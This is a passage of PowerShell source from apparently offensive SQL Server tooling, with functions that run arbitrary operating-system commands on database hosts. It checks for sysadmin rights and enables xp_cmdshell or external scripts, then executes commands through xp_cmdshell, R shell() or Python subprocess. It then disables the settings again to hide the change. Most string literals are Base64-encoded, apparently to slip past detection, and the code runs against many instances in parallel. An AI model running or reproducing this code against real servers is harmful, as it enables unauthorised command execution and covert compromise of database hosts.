        $PipelineItems = $PipelineItems + $_
    }
    End
    {
        $MyScriptBlock = {
            $Instance = $_.Instance
            $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
            if(-not $Instance)
            {
                $Instance = $env:COMPUTERNAME
            }
            if($DAC)
            {
                $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DAC -TimeOut $TimeOut
            }
            else
            {
                $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut
            }
            try
            {
                $Connection.Open()
                if(-not $SuppressVerbose)
                {
                    Write-Verbose -Message "$Instance : Connection Success."
                }
                $DisableShowAdvancedOptions = 0
                $DisableXpCmdshell = 0
                $IsSysadmin = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | select -Property IsSysadmin -ExpandProperty IsSysadmin
                if($IsSysadmin -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA'))))
                {
                    Write-Verbose -Message "$Instance : You are a sysadmin."
                    $IsXpCmdshellEnabled = Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAHgAcABfAGMAbQBkAHMAaABlAGwAbAAnAA=='))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select -Property config_value -ExpandProperty config_value
                    $IsShowAdvancedEnabled = Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAFMAaABvAHcAIABBAGQAdgBhAG4AYwBlAGQAIABPAHAAdABpAG8AbgBzACcA'))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select -Property config_value -ExpandProperty config_value
                }
                else
                {
                    Write-Verbose -Message "$Instance : You are not a sysadmin. This command requires sysadmin privileges."
                    $null = $TblResults.Rows.Add("$ComputerName","$Instance",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvACAAcwB5AHMAYQBkAG0AaQBuACAAcAByAGkAdgBpAGwAZQBnAGUAcwAuAA=='))))
                    return
                }
                if ($IsShowAdvancedEnabled -eq 1)
                {
                    Write-Verbose -Message "$Instance : Show Advanced Options is already enabled."
                }
                else
                {
                    Write-Verbose -Message "$Instance : Show Advanced Options is disabled."
                    $DisableShowAdvancedOptions = 1
                    Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAFMAaABvAHcAIABBAGQAdgBhAG4AYwBlAGQAIABPAHAAdABpAG8AbgBzACcALAAxADsAUgBFAEMATwBOAEYASQBHAFUAUgBFAA=='))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
                    $IsShowAdvancedEnabled2 = Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAFMAaABvAHcAIABBAGQAdgBhAG4AYwBlAGQAIABPAHAAdABpAG8AbgBzACcA'))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select -Property config_value -ExpandProperty config_value
                    if ($IsShowAdvancedEnabled2 -eq 1)
                    {
                        Write-Verbose -Message "$Instance : Enabled Show Advanced Options."
                    }
                    else
                    {
                        Write-Verbose -Message "$Instance : Enabling Show Advanced Options failed. Aborting."
                        $null = $TblResults.Rows.Add("$ComputerName","$Instance",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbABkACAAbgBvAHQAIABlAG4AYQBiAGwAZQAgAFMAaABvAHcAIABBAGQAdgBhAG4AYwBlAGQAIABPAHAAdABpAG8AbgBzAC4A'))))
                        return
                    }
                }
                if ($IsXpCmdshellEnabled -eq 1)
                {
                    Write-Verbose -Message "$Instance : xp_cmdshell is already enabled."
                }
                else
                {
                    Write-Verbose -Message "$Instance : xp_cmdshell is disabled."
                    $DisableXpCmdshell = 1
                    Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAHgAcABfAGMAbQBkAHMAaABlAGwAbAAnACwAMQA7AFIARQBDAE8ATgBGAEkARwBVAFIARQA='))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
                    $IsXpCmdshellEnabled2 = Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAB4AHAAXwBjAG0AZABzAGgAZQBsAGwA'))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select -Property config_value -ExpandProperty config_value
                    if ($IsXpCmdshellEnabled2 -eq 1)
                    {
                        Write-Verbose -Message "$Instance : Enabled xp_cmdshell."
                    }
                    else
                    {
                        Write-Verbose -Message "$Instance : Enabling xp_cmdshell failed. Aborting."
                        $null = $TblResults.Rows.Add("$ComputerName","$Instance",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbABkACAAbgBvAHQAIABlAG4AYQBiAGwAZQAgAHgAcABfAGMAbQBkAHMAaABlAGwAbAAuAA=='))))
                        return
                    }
                }
                Write-Verbose -Message "$Instance : Running command: $Command"
                $Query = "EXEC master..xp_cmdshell '$Command'"
                $CmdResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select -Property output -ExpandProperty output
                if($RawResults)
                {
                    $CmdResults | Select output -ExpandProperty output
                }
                else
                {
                    $null = $TblResults.Rows.Add($ComputerName, $Instance, [string]$CmdResults)
                }
                if($DisableXpCmdshell -eq 1)
                {
                    Write-Verbose -Message "$Instance : Disabling xp_cmdshell"
                    Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAHgAcABfAGMAbQBkAHMAaABlAGwAbAAnACwAMAA7AFIARQBDAE8ATgBGAEkARwBVAFIARQA='))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
                }
                if($DisableShowAdvancedOptions -eq 1)
                {
                    Write-Verbose -Message "$Instance : Disabling Show Advanced Options"
                    Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAFMAaABvAHcAIABBAGQAdgBhAG4AYwBlAGQAIABPAHAAdABpAG8AbgBzACcALAAwADsAUgBFAEMATwBOAEYASQBHAFUAUgBFAA=='))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
                }
                $Connection.Close()
                $Connection.Dispose()
            }
            catch
            {
                if(-not $SuppressVerbose)
                {
                    $ErrorMessage = $_.Exception.Message
                    Write-Verbose -Message "$Instance : Connection Failed."
                }
                $null = $TblResults.Rows.Add("$ComputerName","$Instance",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAHQAIABBAGMAYwBlAHMAcwBpAGIAbABlAA=='))))
            }
        }
        $PipelineItems | Invoke-Parallel -ScriptBlock $MyScriptBlock -ImportSessionFunctions -ImportVariables -Throttle $Threads -RunspaceTimeout 2 -Quiet -ErrorAction SilentlyContinue
        return $TblResults
    }
}
Function  Invoke-SQLOSCmdR
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Connect using Dedicated Admin Connection.')]
        [Switch]$DAC,
        [Parameter(Mandatory = $true,
        HelpMessage = 'OS command to be executed.')]
        [String]$Command = "whoami",
        [Parameter(Mandatory = $false,
        HelpMessage = 'Connection timeout.')]
        [string]$TimeOut,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of threads.')]
        [int]$Threads = 1,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Just show the raw results without the computer or instance name.')]
        [switch]$RawResults
    )
    Begin
    {
        $TblCommands = New-Object -TypeName System.Data.DataTable
        $TblResults = New-Object -TypeName System.Data.DataTable
        $null = $TblResults.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = $TblResults.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = $TblResults.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AbQBhAG4AZABSAGUAcwB1AGwAdABzAA=='))))
        $PipelineItems = New-Object -TypeName System.Data.DataTable
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        if($Instance)
        {
            $ProvideInstance = New-Object -TypeName PSObject -Property @{
                Instance = $Instance
            }
        }
        $PipelineItems = $PipelineItems + $ProvideInstance
    }
    Process
    {
        $PipelineItems = $PipelineItems + $_
    }
    End
    {
        $MyScriptBlock = {
            $Instance = $_.Instance
            $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
            if(-not $Instance)
            {
                $Instance = $env:COMPUTERNAME
            }
            if($DAC)
            {
                $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DAC -TimeOut $TimeOut
            }
            else
            {
                $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut
            }
            try
            {
                $Connection.Open()
                if(-not $SuppressVerbose)
                {
                    Write-Verbose -Message "$Instance : Connection Success."
                }
                $DisableShowAdvancedOptions = 0
                $DisableExternalScripts = 0
                $IsSysadmin = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | select -Property IsSysadmin -ExpandProperty IsSysadmin
                if($IsSysadmin -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA'))))
                {
                    Write-Verbose -Message "$Instance : You are a sysadmin."
                    $IsExternalScriptsEnabled = Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAGUAeAB0AGUAcgBuAGEAbAAgAHMAYwByAGkAcAB0AHMAIABlAG4AYQBiAGwAZQBkACcA'))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select -Property config_value -ExpandProperty config_value
                    $IsShowAdvancedEnabled = Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAFMAaABvAHcAIABBAGQAdgBhAG4AYwBlAGQAIABPAHAAdABpAG8AbgBzACcA'))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select -Property config_value -ExpandProperty config_value
                }
                else
                {
                    Write-Verbose -Message "$Instance : You are not a sysadmin. This command requires sysadmin privileges."
                    $null = $TblResults.Rows.Add("$ComputerName","$Instance",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvACAAcwB5AHMAYQBkAG0AaQBuACAAcAByAGkAdgBpAGwAZQBnAGUAcwAuAA=='))))
                    return
                }
                if ($IsShowAdvancedEnabled -eq 1)
                {
                    Write-Verbose -Message "$Instance : Show Advanced Options is already enabled."
                }
                else
                {
                    Write-Verbose -Message "$Instance : Show Advanced Options is disabled."
                    $DisableShowAdvancedOptions = 1
                    Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAFMAaABvAHcAIABBAGQAdgBhAG4AYwBlAGQAIABPAHAAdABpAG8AbgBzACcALAAxADsAUgBFAEMATwBOAEYASQBHAFUAUgBFAA=='))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
                    $IsShowAdvancedEnabled2 = Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAFMAaABvAHcAIABBAGQAdgBhAG4AYwBlAGQAIABPAHAAdABpAG8AbgBzACcA'))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select -Property config_value -ExpandProperty config_value
                    if ($IsShowAdvancedEnabled2 -eq 1)
                    {
                        Write-Verbose -Message "$Instance : Enabled Show Advanced Options."
                    }
                    else
                    {
                        Write-Verbose -Message "$Instance : Enabling Show Advanced Options failed. Aborting."
                        $null = $TblResults.Rows.Add("$ComputerName","$Instance",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbABkACAAbgBvAHQAIABlAG4AYQBiAGwAZQAgAFMAaABvAHcAIABBAGQAdgBhAG4AYwBlAGQAIABPAHAAdABpAG8AbgBzAC4A'))))
                        return
                    }
                }
                if ($IsExternalScriptsEnabled -eq 1)
                {
                    Write-Verbose -Message "$Instance : External scripts are already enabled."
                }
                else
                {
                    Write-Verbose -Message "$Instance : External scripts enabled are disabled."
                    $DisableExternalScripts = 1
                    Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAGUAeAB0AGUAcgBuAGEAbAAgAHMAYwByAGkAcAB0AHMAIABlAG4AYQBiAGwAZQBkACcALAAxADsAUgBFAEMATwBOAEYASQBHAFUAUgBFACAAVwBJAFQASAAgAE8AVgBFAFIAUgBJAEQARQA='))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
                    $IsExternalScriptsEnabled2 = Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAiAGUAeAB0AGUAcgBuAGEAbAAgAHMAYwByAGkAcAB0AHMAIABlAG4AYQBiAGwAZQBkACIA'))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select -Property config_value -ExpandProperty config_value
                    if ($IsExternalScriptsEnabled2 -eq 1)
                    {
                        Write-Verbose -Message "$Instance : Enabled external scripts."
                    }
                    else
                    {
                        Write-Verbose -Message "$Instance : Enabling external scripts failed. Aborting."
                        $null = $TblResults.Rows.Add("$ComputerName","$Instance",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbABkACAAbgBvAHQAIABlAG4AYQBiAGwAZQAgAGUAeAB0AGUAcgBuAGEAbAAgAHMAYwByAGkAcAB0AHMALgA='))))
                        return
                    }
                }
                $EnabledInRunValue = Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBFAEwARQBDAFQAIAB2AGEAbAB1AGUAXwBpAG4AXwB1AHMAZQAgAEYAUgBPAE0AIABtAGEAcwB0AGUAcgAuAHMAeQBzAC4AYwBvAG4AZgBpAGcAdQByAGEAdABpAG8AbgBzACAAVwBIAEUAUgBFACAAbgBhAG0AZQAgAEwASQBLAEUAIAAnAGUAeAB0AGUAcgBuAGEAbAAgAHMAYwByAGkAcAB0AHMAIABlAG4AYQBiAGwAZQBkACcA'))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select -ExpandProperty value_in_use            
                if($EnabledInRunValue -eq 0){
                    Write-Verbose -Message "$Instance : The 'external scripts enabled' setting is not enabled in runtime."
                    Write-Verbose -Message "$Instance : - The SQL Server service will need to be manually restarted for the change to take effect."
                    Write-Verbose -Message "$Instance : - Not recommended unless you're the DBA."
                    $null = $TblResults.Rows.Add("$ComputerName","$Instance",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAZQByAG4AYQBsACAAcwBjAHIAaQBwAHQAcwAgAG4AbwB0ACAAZQBuAGEAYgBsAGUAZAAgAGkAbgAgAHIAdQBuAHQAaQBtAGUALgA='))))
                    return
                }else{
                    Write-Verbose -Message "$Instance : The 'external scripts enabled' setting is enabled in runtime.'"
                }            
                write-verbose "$instance : Executing command: $Command"               
                $QueryCmdExecute = 
@"
EXEC sp_execute_external_script
  @language=N'R',
  @script=N'OutputDataSet <- data.frame(shell("$Command",intern=T))'
  WITH RESULT SETS (([Output] varchar(max)));
"@
                $CmdResults = Get-SQLQuery -Instance $Instance -Query $QueryCmdExecute -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select Output -ExpandProperty Output
                if($RawResults)
                {
                    $CmdResults                 
                }
                else
                {
                    $null = $TblResults.Rows.Add($ComputerName, $Instance, [string]$CmdResults.trim())                    
                }
                if($DisableExternalScripts -eq 1)
                {
                    Write-Verbose -Message "$Instance : Disabling external scripts"
                    Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAGUAeAB0AGUAcgBuAGEAbAAgAHMAYwByAGkAcAB0AHMAIABlAG4AYQBiAGwAZQBkACcALAAwADsAUgBFAEMATwBOAEYASQBHAFUAUgBFACAAVwBJAFQASAAgAE8AVgBFAFIAUgBJAEQARQA='))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
                }
                if($DisableShowAdvancedOptions -eq 1)
                {
                    Write-Verbose -Message "$Instance : Disabling Show Advanced Options"
                    Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAFMAaABvAHcAIABBAGQAdgBhAG4AYwBlAGQAIABPAHAAdABpAG8AbgBzACcALAAwADsAUgBFAEMATwBOAEYASQBHAFUAUgBFAA=='))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
                }
                $Connection.Close()
                $Connection.Dispose()
            }
            catch
            {
                if(-not $SuppressVerbose)
                {
                    $ErrorMessage = $_.Exception.Message
                    Write-Verbose -Message "$Instance : Connection Failed."
                }
                $null = $TblResults.Rows.Add("$ComputerName","$Instance",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAHQAIABBAGMAYwBlAHMAcwBpAGIAbABlACAAbwByACAAQwBvAG0AbQBhAG4AZAAgAEYAYQBpAGwAZQBkAA=='))))
            }
        }
        $PipelineItems | Invoke-Parallel -ScriptBlock $MyScriptBlock -ImportSessionFunctions -ImportVariables -Throttle $Threads -RunspaceTimeout 2 -Quiet -ErrorAction SilentlyContinue
        return $TblResults
    }
}
Function  Invoke-SQLOSCmdPython
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Connect using Dedicated Admin Connection.')]
        [Switch]$DAC,
        [Parameter(Mandatory = $true,
        HelpMessage = 'OS command to be executed.')]
        [String]$Command = "whoami",
        [Parameter(Mandatory = $false,
        HelpMessage = 'Connection timeout.')]
        [string]$TimeOut,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of threads.')]
        [int]$Threads = 1,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Just show the raw results without the computer or instance name.')]
        [switch]$RawResults
    )
    Begin
    {
        $TblCommands = New-Object -TypeName System.Data.DataTable
        $TblResults = New-Object -TypeName System.Data.DataTable
        $null = $TblResults.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = $TblResults.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = $TblResults.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AbQBhAG4AZABSAGUAcwB1AGwAdABzAA=='))))
        $PipelineItems = New-Object -TypeName System.Data.DataTable
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        if($Instance)
        {
            $ProvideInstance = New-Object -TypeName PSObject -Property @{
                Instance = $Instance
            }
        }
        $PipelineItems = $PipelineItems + $ProvideInstance
    }
    Process
    {
        $PipelineItems = $PipelineItems + $_
    }
    End
    {
        $MyScriptBlock = {
            $Instance = $_.Instance
            $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
            if(-not $Instance)
            {
                $Instance = $env:COMPUTERNAME
            }
            if($DAC)
            {
                $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DAC -TimeOut $TimeOut
            }
            else
            {
                $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut
            }
            try
            {
                $Connection.Open()
                if(-not $SuppressVerbose)
                {
                    Write-Verbose -Message "$Instance : Connection Success."
                }
                $DisableShowAdvancedOptions = 0
                $DisableExternalScripts = 0
                $IsSysadmin = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | select -Property IsSysadmin -ExpandProperty IsSysadmin
                if($IsSysadmin -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA'))))
                {
                    Write-Verbose -Message "$Instance : You are a sysadmin."
                    $IsExternalScriptsEnabled = Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAGUAeAB0AGUAcgBuAGEAbAAgAHMAYwByAGkAcAB0AHMAIABlAG4AYQBiAGwAZQBkACcA'))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select -Property config_value -ExpandProperty config_value
                    $IsShowAdvancedEnabled = Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAFMAaABvAHcAIABBAGQAdgBhAG4AYwBlAGQAIABPAHAAdABpAG8AbgBzACcA'))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select -Property config_value -ExpandProperty config_value
                }
                else
                {
                    Write-Verbose -Message "$Instance : You are not a sysadmin. This command requires sysadmin privileges."
                    $null = $TblResults.Rows.Add("$ComputerName","$Instance",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvACAAcwB5AHMAYQBkAG0AaQBuACAAcAByAGkAdgBpAGwAZQBnAGUAcwAuAA=='))))
                    return
                }
                if ($IsShowAdvancedEnabled -eq 1)
                {
                    Write-Verbose -Message "$Instance : Show Advanced Options is already enabled."
                }
                else
                {
                    Write-Verbose -Message "$Instance : Show Advanced Options is disabled."
                    $DisableShowAdvancedOptions = 1
                    Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAFMAaABvAHcAIABBAGQAdgBhAG4AYwBlAGQAIABPAHAAdABpAG8AbgBzACcALAAxADsAUgBFAEMATwBOAEYASQBHAFUAUgBFAA=='))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
                    $IsShowAdvancedEnabled2 = Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAFMAaABvAHcAIABBAGQAdgBhAG4AYwBlAGQAIABPAHAAdABpAG8AbgBzACcA'))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select -Property config_value -ExpandProperty config_value
                    if ($IsShowAdvancedEnabled2 -eq 1)
                    {
                        Write-Verbose -Message "$Instance : Enabled Show Advanced Options."
                    }
                    else
                    {
                        Write-Verbose -Message "$Instance : Enabling Show Advanced Options failed. Aborting."
                        $null = $TblResults.Rows.Add("$ComputerName","$Instance",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbABkACAAbgBvAHQAIABlAG4AYQBiAGwAZQAgAFMAaABvAHcAIABBAGQAdgBhAG4AYwBlAGQAIABPAHAAdABpAG8AbgBzAC4A'))))
                        return
                    }
                }
                if ($IsExternalScriptsEnabled -eq 1)
                {
                    Write-Verbose -Message "$Instance : External scripts are already enabled."
                }
                else
                {
                    Write-Verbose -Message "$Instance : External scripts enabled are disabled."
                    $DisableExternalScripts = 1
                    Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAGUAeAB0AGUAcgBuAGEAbAAgAHMAYwByAGkAcAB0AHMAIABlAG4AYQBiAGwAZQBkACcALAAxADsAUgBFAEMATwBOAEYASQBHAFUAUgBFACAAVwBJAFQASAAgAE8AVgBFAFIAUgBJAEQARQA='))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
                    $IsExternalScriptsEnabled2 = Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAiAGUAeAB0AGUAcgBuAGEAbAAgAHMAYwByAGkAcAB0AHMAIABlAG4AYQBiAGwAZQBkACIA'))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select -Property config_value -ExpandProperty config_value
                    if ($IsExternalScriptsEnabled2 -eq 1)
                    {
                        Write-Verbose -Message "$Instance : Enabled external scripts."
                    }
                    else
                    {
                        Write-Verbose -Message "$Instance : Enabling external scripts failed. Aborting."
                        $null = $TblResults.Rows.Add("$ComputerName","$Instance",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbABkACAAbgBvAHQAIABlAG4AYQBiAGwAZQAgAGUAeAB0AGUAcgBuAGEAbAAgAHMAYwByAGkAcAB0AHMALgA='))))
                        return
                    }
                }
                $EnabledInRunValue = Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBFAEwARQBDAFQAIAB2AGEAbAB1AGUAXwBpAG4AXwB1AHMAZQAgAEYAUgBPAE0AIABtAGEAcwB0AGUAcgAuAHMAeQBzAC4AYwBvAG4AZgBpAGcAdQByAGEAdABpAG8AbgBzACAAVwBIAEUAUgBFACAAbgBhAG0AZQAgAEwASQBLAEUAIAAnAGUAeAB0AGUAcgBuAGEAbAAgAHMAYwByAGkAcAB0AHMAIABlAG4AYQBiAGwAZQBkACcA'))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select -ExpandProperty value_in_use            
                if($EnabledInRunValue -eq 0){
                    Write-Verbose -Message "$Instance : The 'external scripts enabled' setting is not enabled in runtime."
                    Write-Verbose -Message "$Instance : - The SQL Server service will need to be manually restarted for the change to take effect."
                    Write-Verbose -Message "$Instance : - Not recommended unless you're the DBA."
                    $null = $TblResults.Rows.Add("$ComputerName","$Instance",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAZQByAG4AYQBsACAAcwBjAHIAaQBwAHQAcwAgAG4AbwB0ACAAZQBuAGEAYgBsAGUAZAAgAGkAbgAgAHIAdQBuAHQAaQBtAGUALgA='))))
                    return
                }else{
                    Write-Verbose -Message "$Instance : The 'external scripts enabled' setting is enabled in runtime.'"
                }            
                write-verbose "$instance : Executing command: $Command"               
                $QueryCmdExecute = 
@"
EXEC sp_execute_external_script 
    @language =N'Python',
    @script=N'
import subprocess 
p = subprocess.Popen(`"cmd.exe /c $Command`", stdout=subprocess.PIPE)
OutputDataSet = pandas.DataFrame([str(p.stdout.read(), `"utf-8`")])'
WITH RESULT SETS (([Output] nvarchar(max)))
"@
                $CmdResults = Get-SQLQuery -Instance $Instance -Query $QueryCmdExecute -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select Output -ExpandProperty Output
                if($RawResults)
                {
                    $CmdResults                 
                }
                else
                {
                    $null = $TblResults.Rows.Add($ComputerName, $Instance, [string]$CmdResults.trim())                    
                }
                if($DisableExternalScripts -eq 1)
                {
                    Write-Verbose -Message "$Instance : Disabling external scripts"
